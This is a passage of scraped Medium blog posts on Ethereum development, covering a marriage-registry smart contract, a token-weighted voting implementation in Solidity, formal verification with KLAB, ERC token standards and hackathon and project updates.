like on the Blockchain. For this particular contract, I\u2019ve removed the need of witnesses and made the matrimony process as simple as possible, but without leaving out the possibility of having several authorities or registries that define their own rules for officiating marriages.The marriage process is structured as follows:There is a Marriage Registry that keeps a record of all the marriage proposals and officiated marriages. If someone wants to get married to someone else, all they have to do is to issue a request to the registry, which will verify that both spouses can actually get married.Being able to get married just means, in the context of this registry, making sure that each person has not already married someone else. There could be other registries with different set of rules given that, as I mentioned before, marriage rules vary from place to place.For example, there could be a Marriage Registry that requires both spouses to be over 18 years old; or both of them to be from the same country or even allow a person to be married to more than one person.Or even allow people to marry their\u00a0cousins.The other component is the Marriage contract which holds the information of the marriage such as the addresses of the spouses; the status of the matrimony; the date the ceremony was performed, and it is also the main point of contact for the interaction between spouses, such as accepting one another\u2019s proposal or filing for a divorce.It\u2019s worth mentioning too that the MarriageRegistry contains a few functions that allow an external party to obtain information about a people from it. Anyone can query the registry for the following information:Given any of the spouses, anyone can retrieve the Marriage contract that bonded them.Given a Marriage contract address, anyone can get he \u201cMarriage Certificate\u201d containing the address of both spouses and the date they married.Given one of the spouses, anyone can find out who they are married to.Given two spouses, anyone can find out if they are married or not.Given one of the spouses, anyone can find out if that person is married or not.These functions are meant to be used, mainly, by other entities that care about a person being married or single for their own processes and procedures. For example, a bank could query this registry to obtain information about the marital status of a couple asking for a joint mortgage.How to use the contracts:The MarriageRegistry contract has been deployed in Ropsten testnet and verified through Etherscan at address: 0x57f38682c5E802f78cCC71B2D2932230b1C41c47You can find the source code for the two contracts involved (Marriage.sol and MarriageRegistry.sol) on my Github Repository.You can use them to marry someone like this:1-\ud83d\udc8d Propose marriage to someone: Marriage contracts can only be generated by the MarriageRegistry contract, so, if you want to propose to someone, all you have to do to initiate the process is calling the proposeMarriage() function on MarriageRegistry and specify the address of the person you are proposing to.2- \ud83c\udf39 Have your significant other accept or reject the proposal: The person being proposed marriage now has the option to either reject or accept the proposal. If they reject the proposal by calling rejectProposal() on the newly created Marriage contract, the marriage is off and the contract is destroyed. On the other hand, if they call acceptProposal() then it\u2019s official, you are married!\u00a0When you called proposeMarriage() it generated a new Marriage contract tying both you and the recipient of the proposal. You have to share the address of that contract with the other person for them to act upon it. You can either find it on Etherscan.com or call getMarriageContract() on MarriageRegistry by passing either address as parameter.3- \ud83d\udcd9 Get your marriage certificate: You (or anyone) can query the MarriageRegistry to get the marriage certificate stating the address of both spouses as well as the marriage date. To get the marriage certificate just call getMarriageCertificate() and pass the marriage contract address as parameter.4-\ud83d\udc94 Getting divorced: Sometimes married life is not as we thought it would be and the couple feels it is best to get divorced. For situations like this, we have the requestDivorce() function. As with the marriage proposal, both spouses have to agree on this in order for the divorce to be performed. Once both parties call this function, the contract will be destroyed and they will be free to marry someone else. (Or to stay single \ud83c\udf8a)Where to go from\u00a0here?First of all, if you used these contracts to get married, congratulations!\u00a0Good luck getting some days off at work with the certificate this registry issues, though. \ud83d\ude1eWhen you are back from your honeymoon \ud83c\udfd6, we can discuss a few improvements that could be made to these contracts, for example:Even though I mentioned the possibility of extending the Marriage Registry and creating other registries with different sets of rules, there\u2019s a problem with this approach. If there are several registries, there\u2019s currently no central registry that keeps track of marriages across these registries. So, if I got married in registry A, registry B would not know about it and I could also get married in registry B if I wanted so. One solution could be to have a central registry\u200a\u2014\u200aa registry of registries\u200a\u2014\u200athat keeps track of all registries provides a way for registries to ask each other for information.The current implementation accepts divorces so, if both spouses agree, they get immediately divorced by eliminating the Marriage contract (calling self-destruct) and an event is fired in the MarriageRegistry to log the divorce. For the divorce to happen both parties have to agree, which not always happens. Right now we are not considering the case where one of the parties requests the divorce, but the other refuses to sign. What should be done in these cases?Additionally, I am not contemplating, for example, the death of one of the spouses. If one of them were to pass away, or be incapacitated, there\u2019s no way for a divorce to happen since it requires the agreement of both parties.Anyone can query the registry to get the marital status of any given person (as long as they know their address or the marriage contract\u2019s address), this is great as long as this information is used with good intentions, but it also opens the possibility of someone using this information to damage one or both of the spouses. We should probably restrict access to this information and only make it available if one of the spouses authorizes so.You can get married to a smart car, a token crowdsale, a multisig wallet or whatever, sort of.The contract doesn\u2019t perform any checks to make sure either spouse is an Externally Owned Account. So, another contract could be provided as parameter and if that contract implements the necessary functions to accept the proposal, then there\u2019s a marriage.\u00a0As a matter of fact, a married couple could marry another married couple, if they wanted so (and built such a contract). \ud83d\udc6b \ud83d\udc6b https://www.youtube.com/watch?v=t_jHrUE5IOk", "responses": "2"}, {"title": "Hydro Dev Update:\u00a05/4", "author_name": "Andy Chorlian", "link": "https://medium.com/hydrogen-api/hydro-dev-update-5-4-204f318f320f?source=search_post", "post_date": "May 4, 2018", "readtime": "2 min read", "upvotes": "227", "content": "Hydro Dev Update:\u00a05/4Andy ChorlianBlockedUnblockFollowFollowingMay 4, 2018Every Friday, the Hydro dev team provides updates on what they\u2019ve been working on over the past week.May the 4th be with you! We have been internally testing our Hydro Client Raindrop application, and we are extremely excited about the release! Our Front End Team has been coding away to make sure the application is bug free and looking gorgeous. Meanwhile, Noah and I have been making sure that our API and documentation are are all up to snuff. We have moved over our API to use OAuth authentication and are updating all of our error messages to make sure that they are clear and concise.Alongside this, Noah and I have completed our internal POC of the Snowflake smart contracts. As we continue to build this out you can monitor our progress here. Our main focus this week was on making sure the logic of the identity contract works alongside the escrow contract. This is crucial for us, as escrowing Hydro is a key piece of our Snowflake protocol. It is still very much in concept and testing phases so expect lots of changes. If you\u2019re interested in chatting with us about blockchain-based identity or our 2FA, don\u2019t hesitate to reach out on Discord!We\u2019d love to hear from you! Please get in touch via Discord, Reddit, or Telegram.", "responses": "1"}, {"title": "Token-weighted voting implementation Part\u00a02", "author_name": "Elena Dimitrova", "link": "https://medium.com/colony/token-weighted-voting-implementation-part-2-13e490fe1b8a?source=search_post", "post_date": "Sep 28, 2016", "readtime": "5 min read", "upvotes": "155", "content": "Token-weighted voting implementation Part\u00a02Secret voting and the double linked\u00a0listElena DimitrovaBlockedUnblockFollowFollowingSep 28, 2016This is the second of a 3-part article which presents the Solidity-based implementation of the Token weighted voting protocol.Here, we continue to define the double linked list used to manage vote secrets and we dive into the voting implementation itself as well as the logic behind determining if an address is locked.Vote secrets data structure\u200a\u2014\u200athe double linked\u00a0listVote secrets are stored in a double linked list. Each entry consists of the poll id, vote secret and is ordered by poll close time. The list contains only the unrevealed vote secrets for a user, i.e. when a vote is revealed, it is removed from this list.Double linked list of vote secrets ordered by poll close\u00a0timeZero-entry itemThe list implementation uses a helper zero-entry item where the previousItem link points to the last item in the list and the nextItem link points to the first item in the list, thus closing the list structure.This design gives us less edge cases as we don\u2019t need to track variables such as the first item in the list, the item count or cater for special cases where we\u2019re inserting at the start or at the end of the list.Design for poll votes that close at the same timeAdditionally, we need to design support for cases where two or more polls close at the same time, thus having conflicting pollCloseTime in the ordered list. We solve this by having a second inner double linked list. We move the pollId and vote secret into this inner list, leaving the outer list to just holding pollCloseTime information.Example design for this above, models a user having voted 5 times in polls with Ids: 1, 5, 8, 12 and 14. Polls 1 and 5 close at the same time at timestamp 10, while the other polls (8, 12 and 14) close at unique times, respectively 52, 123 and 456 and thus have just a single vote secret entry against them in the inner list.The storage data model of the key/value pairs for two linked lists can therefore be modelled as follows//Doubly linked list holding polls closeTimessha3(\"Voting\", userAddress, pollCloseTime, \"prevTimestamp\") => uint256 prevTimestampsha3(\"Voting\", userAddress, pollCloseTime, \"nextTimestamp\") => uint256 nextTimestamp//Doubly linked list holding vote secretssha3(\"Voting\", userAddress, pollCloseTime, \"secrets\", pollId, \"secret\") => bytes32 secretsha3(\"Voting\", userAddress, pollCloseTime, \"secrets\", pollId, \"prevPollId\") => uint256 pollIdsha3(\"Voting\", userAddress, pollCloseTime, \"secrets\", pollId, \"nextPollId\") => uint256 pollIdSorting double linked lists\u00a0In the case where the smart contract is responsible for finding the position in the list for a new vote, it\u2019s possible that in the transaction inserting the vote runs out of gas, as we iterate through items to find the right order.We solve this by delegating to the user the job of providing us the position where their vote needs to be inserted. We validate the position info they give us and do the insert.In addition to lower gas costs, as we don\u2019t sort on the blockchain, this approach has the added benefit of a fixed and predictable transaction cost for adding a vote secret to the list, as storage cost is fixed.Secret votingWhenever a user makes a vote, first they must establish what their precommitted vote secret is to be. They do this by finding the Keccak hash of a salt value and the chosen poll option Id. This is the equivalent of calling sha3(salt, pollOptionId); in Solidity.The salt is required so that the user\u2019s vote cannot be discerned pre-reveal. The salt is revealed during the reveal phase, and so should not be sensitive, but it should be unique for every vote and not have to be remembered or chosen by the user. The voteID signed with the user\u2019s private key, for example, would meet these requirements, as would the brief signed with the user\u2019s private key, which would have the additional benefit of allowing the user to prove what they voted on, as well as the direction they voted.The user then calls the vote function,function submitVote(    uint256 pollId,    bytes32 secret,    uint256 prevTimestamp,    uint256 prevPollId)which has four arguments:uint256 pollId\u200a\u2014\u200aId of the poll which they\u2019re voting onbytes32 secret\u200a\u2014\u200aThe secret string described aboveuint256 prevTimestamp\u200a\u2014\u200aThe timestamp that the secret should be inserted after for the outer list (of poll closing times) to remain correctly sorted. If this is 0, then the current element is the first element in the linked list that comes after the zero-entry item.\u00a0uint256 prevPollId\u200a\u2014\u200aThe poll Id that the secret should be inserted after for the inner list (of poll ids and vote secrets) to remain correctly sorted.A number of validations then take place before the secret is added, to ensure the poll is open and its closingTime hasn\u2019t past as well as the position in the outer and inner lists is correct.isAddressLocked functionThe purpose of the double linked lists are two fold: firstly as described above, to store unrevealed votes and secondly, to determine if an address is locked.An address is defined as locked, if there is at least 1 vote a user has to reveal, i.e. at least one vote for poll which has closed.This check is implemented in a function, namely isAddressLocked(address) which looks at the outer list of pollCloseTimes, takes the first item in the list (after the zero-entry item) and compares the now block timestamp against it. Since the list is ordered by pollCloseTimes, we guarantee that if the first item in the list is less than the now timestamp, i.e. the poll close time for that first item has passed, there is at least one vote secret which needs to be revealed and therefore the user address is locked.Sample scenario for a locked\u00a0addressThis model can be implemented as followsIn the third and final article we\u2019ll examine how the isAddressLocked function above is used to extend the token implementation. We also look at the mechanics of revealing a vote.", "responses": "4"}, {"title": "ETHBerlin and state of the crypto ecosystem", "author_name": "Stepan Gershuni", "link": "https://medium.com/@sgershuni/ethberlin-and-state-of-the-crypto-ecosystem-7e2bd05e04b2?source=search_post", "post_date": "Sep 11, 2018", "readtime": "3 min read", "upvotes": "261", "content": "ETHBerlin and state of the crypto ecosystemStepan GershuniBlockedUnblockFollowFollowingSep 11, 2018Guten morgen from Berlin. It\u2019s been a fantastic week with some of the most energetic and insightful people from crypto industry.Our teamWe flew in from Moscow with the whole Mixbytes team, split up and managed to finish three distinct projects:Token Curated RatingSolidity implementation of the algorithm that allows to curate a rating of items with staking ether or tokens. The model is resilient to large stake attacks and bots, whereas most modern DPoS algorithms are not. In the end we had over 600 lines of Solidity codes, completely written from scratch and I think even judges couldn\u2019t believe we managed to do this much work (plus beautiful frontend during the hackathon).Ring Signatures based anonymous votingAnother team was focusing on bringing BN256 elliptic curve into Ethereum via smart contract and implement anonymous voting based on that.Apache Parquet implementation for EthereumOur CTO single-handedly was working on creating a column-based database for Ethereum which allows for up to 3x data compression and fee reduction.Organization and hackathon space was fantastic! We\u2019re definitely looking forward to repeating this experience again.In addition, here\u2019s an unordered list of my personal insights and just general understanding of the crypto space right now:Public ICOs are finally dyingIt was never a news for anyone with enough experience from traditional VC industry that ICO craze of 2017 is not going to end well. Finally the market in general is getting to this rational conclusion that 100x in one month times are over. Private rounds with more or less mature legal frameworks around those deals are finally starting to dominate the market.The only two projects in crypto that are currently working are Bitcoin and EthereumEverything else, even though does have a great potential and really smart ideas inside, still is in too early stages. Great projects have raised some millions of dollars but this does not guarantee success to all of them in any way. Moreover, if you just look at the traction and real usage, all those networks, protocols and apps are basically dead. It does not mean that they can\u2019t become Googles and Amazons of the future, but this is definitely not happening in one year.Crypto keeps attracting most brightest and brilliant developersAll of those billions of dollars raised plus a constant inflow of motivated, inspired and brilliant developers just cannot result in anything else than awesome technology. The trick is that we don\u2019t know yet which of those technologies will be actually used by regular users. Unless it\u2019s as easy for new users as status quo OR unless it solves some of their desperate needs, dApps and blockchains won\u2019t be used by millions of users.Solidity development ecosystem is not ready yetEven though smart contracts is a very powerful idea, Solidity still lack some of the fundamental development tools. It often takes hours of debugging with no ability to actually trace smart contract execution.Keep buidling and see you on the plains of decentralized web!", "responses": "1"}, {"title": "Your Final Guide About Creating Simple and Advanced ICO Smart Contracts", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/ethereum-developers/your-final-guide-about-creating-simple-and-advanced-ico-smart-contracts-50a7d363417b?source=search_post", "post_date": "Aug 11, 2018", "readtime": "23 min read", "upvotes": "182", "content": "Your Final Guide About Creating Simple and Advanced ICO Smart ContractsMerunas GrincalaitisBlockedUnblockFollowFollowingAug 11, 2018When it comes to token contracts everything is easy. Most of the job is done since lots of companies have developed trusted ERC20 solutions that you can use for your project.However ICO contracts are a whole different story. You could use the ones provided by several different companies but they are harder to implement and are designed in a specific way that may be incompatible with your desired set-up.So my recommendation is to always create your own ICO Smart Contracts from zero. It is harder yet it will show you what\u2019s behind the scenes and how it works. You\u2019ll also be able to modify them and add new features later on for different kinds of ICOs.Before starting I want to warn you that this code may not work in the future since there are lots of changes in Solidity continually so pay close attention to the ideas behind the code and apply them as best as you can.Here\u2019s the index:Preparing the basic structureDeveloping the Crowdsale contractImplementing the new token contract featuresAdvanced ICOs: Variable token pricingConclusion", "responses": "5"}, {"title": "Formal Verification for n00bs -Part 2: proving the correctness of a\u00a0token", "author_name": "Marek Kirejczyk", "link": "https://medium.com/ethworks/formal-verification-for-n00bs-part-2-proving-the-correctness-of-a-token-74085f5cd6c1?source=search_post", "post_date": "Feb 2", "readtime": "6 min read", "upvotes": "549", "content": "Formal Verification for n00bs -Part 2: proving the correctness of a\u00a0tokenMarek KirejczykBlockedUnblockFollowFollowingFeb 2This is the second post of a series Formal Verification for n00bs:Part 1: The K ecosystemPart 2: Proving the correctness of a tokenPart 3: Formal Verification for n00bs -Part 3: An attempt to prevent classic hack with ActPart 4: Understanding K languageIn this post, we will explain an example of a high-level semantics of a single function of an Ethereum smart contract and a step-by-step guide for executing the proof.We will take a look at an official example given by KLAB in their GitHub repository of a transfer function for a simple token.ExampleThe first important file is the source file of the analyzed contract token.sol, see below.Second important file is high-level semantics of a function transfer from the Token contract above. File spec.md contains semantics written in ACT, a specific DSL language, created by KLAB. See below.Semantics step-by-stepThe specification above is split logically into 4 sections:Preamble: Consists of behavior and interface headers. States behavior (intended!) of what function and from which contract we are about to describe;Types: a section with declarations of auxiliary variables;Statements of our semantic claim: here are described under the storage header;Assumptions of our semantic claim: covered by two headers: iff and if.PreambleThe syntax is as follows:where:<name>\u200a\u2014\u200astands for our name for our described semantics, for informative purposes only. It does not need to be the same as the name of the function, as in our case;<Contract>\u200a\u2014\u200aidentifies the name of considerate contract;<function>\u200a\u2014\u200aidentifies the name and the interface of considerate function.So, in our case, we declare that we are starting the description of intended behavior of a function transfer from the contract Token.TypesTypes are our internal variables used only for the purpose of our specification. We use EVM types here. In our case, we declared FromBal and ToBal, both uint256 integers.AssumptionsWe will now focus on assumptions that are at the bottom of the spec, specifically under headers iff and if. The meaning of this section is slightly unintuitive:iff <condition>\u200a\u2014\u200astates intention that condition is either true or execution will revert;if <condition>\u200a\u2014\u200astates intention that we care only about the case when the condition is true.Note that in our example we have a somewhat complex condition for iff.The construction above states that values of all <expression_i> fit inside range of <type> (i.e. no overflows happen).In our case: both (FromBal-Value) and (ToBal+Value) must contain in the range of uint256.The condition for if is much simpler. It just states that CALLER_ID is different from To, where CALLER_ID denotes the address of the caller of the transfer function.About assumptions more\u00a0formallyIntuitive meaning for semantics is the following: if assumptions are met before the execution of the function, then\u200a\u2014\u200aafter the execution\u200a\u2014\u200aall the statements must hold.Here, this is almost true. A small hook is in the fact, that the assumptions part is divided into if and iff part. Formally, it works the following way:denotes that:if\u200a\u2014\u200aat the beginning\u200a\u2014\u200aboth A and B hold, then the execution finishes with success and afterwards all Statements holds;if\u200a\u2014\u200aat the beginning\u200a\u2014\u200aB holds and A doesn\u2019t hold, then the execution finishes with a REVERT;the case when B does not hold is not covered by the considerated semantics.StatementsIn our case, statements section is described only by two clauses, both under storage header. In general, other headers are possible (stack, pc -program counter), but let\u2019s focus precisely on what we have:A line <X> |-> <Y> => <Z> can be stated informally as:If we denote the value of the memory (before the execution) at address <X> with <Y>, then it is equal to <Z> after the execution.Unobvious aspect of the above notation is hidden in the declaration of <X>. The issue comes from the fact that our semantics are verified not with the source code but with the corresponding bytecode of the contract. It means that we cannot refer directly to variables (balanceOf, totalSupply) but we need to provide the storage address(or key in ethereum storage Merkle Patricia trie if you will) that keeps the data (here we refer to low-level implementation of EVM). This is somewhat complicated (especially for maps) and the details can be found [here]. For our purposes it is sufficient to know that element of index i in a map balanceOf in our contract is kept in the Merkle tree at position hash(0 + i) which is denoted as #hashedLocation(\u201cSolidity\u201d, 0, i) in language K (that is underneath ACT). 0 comes from balanceOf being the very first variable declaration in the contract. At this point you might be a bit lost since in the spec file you can see for example #Token.balances[To] that seems to refer directly to the variable balanceOf. This is however only an illusion since in the file klab/examples/token/src/storage.mdyou see a macro that translates this expression into to actual address. This is written in K language. We will dig into K in future posts.The high-level semantics: altogetherFinally, the intended semantics described in the spec file might be in informally expressed as follows:The behaviour of transfer(address To, uint Value) when the address of the caller is equal to To is undefined. So we assume that CALLER_ID is always different from To. Then, if either (balanceOf[To] + Value) or (balanceOf[CALLER_ID]-Value) falls out of range of uint256, the function finishes wit REVERT. Finally, if both above expressions are in range of uint256, then the value of balanceOf[CALLER_ID] decreases by Value, and balances[To] increases by Value.3, 2, 1\u00a0\u2026Action!Let\u2019s check (automatically!) if the above semantics is corresponding to the actual code. We need to:Compile the source file into the bytecode. The result is already here:klab/examples/token/dapp/out/token.sol.jsonIf you wish to repeat this step by yourself, remember to compile with the flags:2. Build K statements from the bytecode and semantics. You can do that by runninginside the directory examples/token. The result will be visible at examples/token/out/specs.To reproduce the above step you need to have klab installed. (A detailed tutorial for this is at klab GitHub)3. Run the machinery. KLAB uses a client-server architecture, so you need to run two processes (same as above, klab must be installed):Server:Client:(it may take a while: on my MacBookAir it took ~10 minutes)Please note, that\u200a\u2014\u200ain step 2\u200a\u2014\u200athe description compiled into two different K statements (i.e. one statement describes the case when iff section holds and the other\u200a\u2014\u200awhen it fails). So, to verify our semantics, these K statements have to both pass. That is also why the client above runs two tests, one after the other.So: what have we just\u00a0proved?If both above K statements passed the klab verification, it means that the considerate code really behaves exactly as described in our semantics. Well, a precisian would add: unless there is a bug in underneath KEVM description of EVM, or there is a bug in K-framework itself\u00a0;)What next?Homework recommendation\u00a0:)1. Try to spoil the implementation (for example remove safe math operations) and re-run the proving process to make sure that the proof will fail.2. Try to write a high-level semantics for the same function, but for the not-yet-covered case, i.e. CALLER_ID == To and verify if it is consistent with the actual code.3. See https://github.com/dapphub/fv-tutorial.git\u200a\u2014\u200aa great set of tasks prepared by dapphub for Devcon4 workshop. Here the problem is reversed to the above problem 1. Given implementations and specifications that do not agree with each other, try to fix it.AcknowledgmentsThanks to Tomasz Kazana for his support and contribution to this post.", "responses": "1"}, {"title": "Token-weighted voting implementation Part\u00a03", "author_name": "Elena Dimitrova", "link": "https://medium.com/colony/token-weighted-voting-implementation-part-3-821dde0a674b?source=search_post", "post_date": "Nov 11, 2016", "readtime": "3 min read", "upvotes": "195", "content": "Token-weighted voting implementation Part\u00a03Token LockingElena DimitrovaBlockedUnblockFollowFollowingNov 11, 2016This is the last of a 3-part article which presents the Solidity-based implementation of the Token weighted voting protocol.In part 2 of this article we concluded by defining the isAddressLocked function in our VotingLibrary which is key to the implementation of the token locking logic we focus on here. Further on, we define the algorithm of revealing and counting secret votes as well as token unlocking.Token lockingOur token contract implementation is based on the ERC #20 standard where there are two functions that enable token transfers: transfer and transferFrom. To enable token locking, we extend these functions with the following logic:Token locking\u00a0logicOnce transfer is called, we first establish whether the sender or recipient addresses are locked via the isAddressLocked function in our Voting contract, described in part 2 of this article.In the case when the sender is locked, we fail the transfer. If however the recipient is locked, we hold the transfer amount in an onHoldBalance. After the user reveals their vote, thus unlocking their tokens, that onHoldBalance is transferred to their available balance. The held balance \u2018read\u2019, \u2018write\u2019 and \u2018transfer to balance\u2019 functions are defined as follows:The gas cost changes resulting from the additional checks we introduced, show transfer function gas cost has increased only by ~4,500 gas (measured at 53559 before, 58146 after) or roughly 8.5%.Reveal vote transactionThis algorithm requires users to always reveal their votes, even if the reveal period has expired. When the pollCloseTime is reached, every user who had voted in that particular poll has their tokens locked, essentially the isAddressLocked function called for their address returns true. This entails that all token transfer calls they make, as per above, will fail and any transfers tokens they receive, will be put on hold. This is mitigated by the fact that a user can unlock their tokens immediately after the poll closes by revealing their vote. This revealVote transaction is detailed below.Reveal vote\u00a0logicThis is token-weighted voting, so firstly we retrieve the user token balance as this affects how we count the vote\u00a0.Secondly we validate the state by checking that the poll has closed and the vote secret is the same as the one submitted when the user voted. This is done by comparing the saved secret to the hash of the salt and pollOptionId the user has voted on. For details of generating the secret vote, see Secret voting in part 2 of this article.Once the vote is revealed and validated, we determine whether to count it in the final poll results. This is determined again by the poll status property, which if resolved, means the admin has taken the final poll results and counting votes is over. Otherwise, the votes on the decision are incremented appropriately based on the current balance of the revealing user which we had already retrieved in the first part of this transaction. For example, if a user A with 1200 tokens had voted for option X, then the total count of poll option X is increased by 1200 once user A submits their revealVote transaction (and before the poll is resolved).We then continue to unlock the user account for token transfers and any tokens that have been on hold are transferred to their standard available balance. Note that tokens are only released once no unrevealed votes remain. As it could be the case that there are other votes left to be revealed, in which case the current revealVote transaction doesn\u2019t unlock the account.Devcon2This implementation was presented at Devcon2 (which is where the featured photos of the Shanghai skyline are from, in case you wonder about the connection between China and democratic voting protocols).The recording from our presentation there gives a good high level overview of the theory and practice of this implementation.", "responses": "3"}, {"title": "Ethereum Token Standards", "author_name": "ChronoBank.io", "link": "https://blog.chronobank.io/ethereum-token-standards-19fbcc54fe27?source=search_post", "post_date": "Apr 26, 2018", "readtime": "4 min read", "upvotes": "269", "content": "Ethereum Token StandardsThere are many different possible ways of creating and structuring a token. What is ERC, ERC 20, ERC 721, ERC 884 and\u00a0more.ChronoBank.ioBlockedUnblockFollowFollowingApr 26, 2018\ud83c\udf0d Read in \ud83c\uddea\ud83c\uddf8 Espa\u00f1ol \ud83c\uddf7\ud83c\uddfa \u0420\u0443\u0441\u0441\u043a\u0438\u0439 \ud83c\udde8\ud83c\uddf3 \u4e2d\u6587 \ud83c\uddf0\ud83c\uddf7 \ud55c\uad6d\uc5b4You might have seen the phrase \u2018ERC-20\u2019 when reading about Ethereum tokens. This refers to a particular standard for tokens, which is the most common and widely-used on the Ethereum platform. This widespread usage is the reason that TIME itself is an ERC-20 token, and why the ChronoWallet supports the same standard (you can create and manage any ERC-20 token using our software). Most exchanges and other wallet platforms support this standard too. However, other standards have been proposed, and there are many different possible ways of creating and structuring a token.What is\u00a0ERC?ERC stands for Ethereum Request for Comments. This idea is modelled on the Requests for Comments published by the Internet Engineering Task Force (IETF) and the Internet Society (ISOC), which are the main technical development and standards-setting bodies for the internet. An ERC is a type of EIP, or Ethereum Improvement Proposal. Just like the Bitcoin Improvement Proposals (BIPs), only a few of these are actually implemented.ERC stands for Ethereum Request for\u00a0CommentsTo meet the ERC-20 token standard, an Ethereum token has to include a specific set of functions that means they act and can be used in a certain way. Arguably these are little more than common sense, since without them it would be far more complex to deploy and manage tokens. But codifying these principles allows other applications and smart contracts to interact with ERC-20 tokens in a known, standard and predictable way.ChronoBank\u2019s flagship token, TIME, is an ERC-20 token, and all of the largest ICOs on Ethereum have also released ERC-20 tokens. However, ERC-20 isn\u2019t perfect, and there\u2019s always room for improvement.New standards for tokens are proposed all the time. These are carefully considered by developers and the community. Due to the importance of maintaining compatibility and the disruption of introducing new standards, only a few make it further than the proposal stage, but there are some it\u2019s worth knowing about.ERC-223. This proposal seeks to fix the problem that ERC-20 tokens become stuck when sent to a smart contract that is not intended to work with ERC-20 tokens. Significant funds have been lost when users have accidentally sent tokens to such a contract.ERC-721. Most tokens are \u2018fungible\u2019\u200a\u2014\u200athat is, every token is the same as another. Fungibility is an important principle of monetary supply\u200a\u2014\u200aevery $10 bill needs to be treated the same (and considered as valuable as) any other, for example. ERC-721 proposes a token standard whereby tokens are not fungible: they are each unique. One of the most well-known implementations of this standard is the CryptoKitties game, which features unique, collectible cats. The Cryptocup World Cup game also uses this feature.ERC-827. ERC-20 tokens allow the transfer of value only. ERC-827 allows the transfer of value and data. Additionally, third parties can approve spending of tokens. The creators of ERC-827 have taken pains to keep their code brief and to maintain full compatibility with ERC-20 tokens.ERC-948. This proposal is designed to connect subscription businesses with consumers. Subscription-model businesses are booming, particularly in sectors such as streaming media (e.g. Netflix). As more and more businesses start to use the blockchain, it will be important to support subscriptions on Ethereum and other platforms. Doing so under the ERC-20 standard would be complex and entail unnecessary frictions for the consumer.ERC-884. Following a recent Bill, Delaware General Corporation Law now explicitly allows for the use of blockchains in maintaining corporate share registries. ERC-884 is designed to represent equity issued by any Delaware corporation, whether private or public, and includes several provisions over and above ERC-20 that support this use case. These include the requirement for token owners to be whitelisted/identity verified as an integral part of the token.These are just some of the many proposals for Ethereum token standards. The beauty of a decentralised system is that anyone can make an improvement proposal and have it considered by the community.", "responses": "1"}, {"title": "State Channels for Babies Pt.\u00a01", "author_name": "BlockChannel", "link": "https://medium.com/@BlockChannel/state-channels-for-babies-50ec876f755b?source=search_post", "post_date": "Jul 26, 2018", "readtime": "3 min read", "upvotes": "310", "content": "State Channels for Babies Pt.\u00a01Helping Blockchains Take Their First\u00a0StepsBlockChannelBlockedUnblockFollowFollowingJul 26, 2018Cross-Post: This post was originally written by Hunter Hillman, and was republished from the Connext blog with their explicit permission.Baby Learns to Walk (&\u00a0Scale)After our introduction to blockchains, Blockchains for Babies, we\u2019re proud to present the next installment in the series! There are many developers working very hard on scaling solutions that are essential for the mainstream adoption of blockchain-based technologies. But a lot of terms get thrown around\u200a\u2014\u200aSharding, Plasma, State Channels, Sidechains\u200a\u2014\u200abut what does it all mean?In this installment, we\u2019re going to take a dive into what state channels are and how they can make blockchains more practical for everyone by assisting with scalability. This chapter relies on terms and concepts from the original #blockchainsforbabies, so if you haven\u2019t read it yet check it out here!Now, without further ado, we\u00a0present:", "responses": "1"}, {"title": "Token-weighted voting implementation Part\u00a01", "author_name": "Elena Dimitrova", "link": "https://medium.com/colony/token-weighted-voting-implementation-part-1-72f836b5423b?source=search_post", "post_date": "Sep 19, 2016", "readtime": "4 min read", "upvotes": "109", "content": "Token-weighted voting implementation Part\u00a01Poll LifecycleElena DimitrovaBlockedUnblockFollowFollowingSep 19, 2016This is the first of a 3-part article which presents the Solidity-based implementation of the Token weighted voting protocol. I am presenting the end-to-end implementation overview of this at DevCon2 and these 3 articles aim to go into the detail of this.\u00a0Here, we examine the lifecycle of a poll and its data structure.High-level contract\u00a0designBefore we go into the implementation details, it\u2019s necessary to understand the Colony contract design at a high level.The Colony contract itself serves as the interface to the user.The library layer encapsulates the business logic for different domains, e.g. TokenLibrary contains the logic for managing Colony tokens, Voting library contains the poll and votes management logic etc. The Security and Task library in the diagram below are greyed out as they\u2019re not directly relevant in the context of this article but they form an integral part of the Colony network.While we use libraries to encapsulate business logic, we use a generic storage contract to persist Colony data, e.g. storing information about the token balances, polls and votes etc.This contracts design is established following our chosen approach for writing upgradable contracts.Colony high level contract\u00a0designIn this first article on poll management, all functionality is encapsulated into the Voting Library implementation.Poll data structureSimilar to the traditional sense of what makes up a poll, we have implemented the following properties:description\u200a\u2014\u200acontains the poll question itself, e.g. \u201cShould Scotland be an independent country?\u201dpoll options\u200a\u2014\u200athere should be a minimum of 2 options for each poll, e.g. \u201cYes\u201d, \u201cNo\u201dstart time\u200a\u2014\u200athe point in time when the poll opens for votingclose time\u200a\u2014\u200athe point in time when the poll closes for votingpoll status\u200a\u2014\u200aa poll goes through the stages of being created, active (open for votes or revealing votes) and resolvedThese are implemented as bytes32 key mappings to their respective EterenalStorage-supported types.bytes32 Key                                  Mapped value typesha3(\"Poll\", pollId, \"description\")         => stringsha3(\"Poll\", pollId, \"option\", idx)         => stringsha3(\"Poll\", pollId, \"startTime\")           => uint256sha3(\"Poll\", pollId, \"closeTime\")           => uint256sha3(\"Poll\", pollId, \"status\")              => uint256In addition, there are two global properties we maintain for the purpose of enumerating through polls and poll options. We keep a count of polls and poll options and never delete them. Thus we maintain a \u201cpoll count\u201d global property which helps us keep track of this and used to generate the ID of the next item when it\u2019s created.bytes32 Key                                  Mapped value typesha3(\"PollCount\")                           => uint256sha3(\"Poll\", pollId, \"OptionsCount\")        => uint256Poll LifecyclePolls can be managed by admins only and their lifecycle is a one-way staged process as follows:Poll LifecycleTo ensure the stages are sequential, we make use of a modifier to ensure the poll is currently with the correct status.modifier ensurePollStatus(uint256 pollId, uint256 pollStatus){   var currentStatus = getUIntValue(sha3(\u201cPoll\u201d, pollId, \u201cstatus\u201d));   if (pollStatus != currentStatus) { throw; }   _}The following poll management functions have been implemented in our Voting library, which set the required properties outlined above, i.e. description, poll option, open and close times and status:function createPoll(string description) {...}function addPollOption(uint256 pollId, string pollOptionDescription)  ensurePollStatus(pollId, 0)  returns (bool) {...}function openPoll(uint256 pollId, uint256 pollDuration)  ensurePollStatus(pollId, 0)  returns (bool) {...}function resolvePoll(address _storageContract, uint256 pollId)  ensurePollStatus(pollId, 1)  returns (bool) {...}Let\u2019s run through a sample call sequence for this:colony.createPoll(\"Should the United Kingdom remain a member of the EU?\");colony.addPollOption(1, \"Yes\");colony.addPollOption(1, \"No\");colony.openPoll(1, 24);// forward time past the poll close timecolony.resolvePoll(1);Poll close\u00a0timeThere 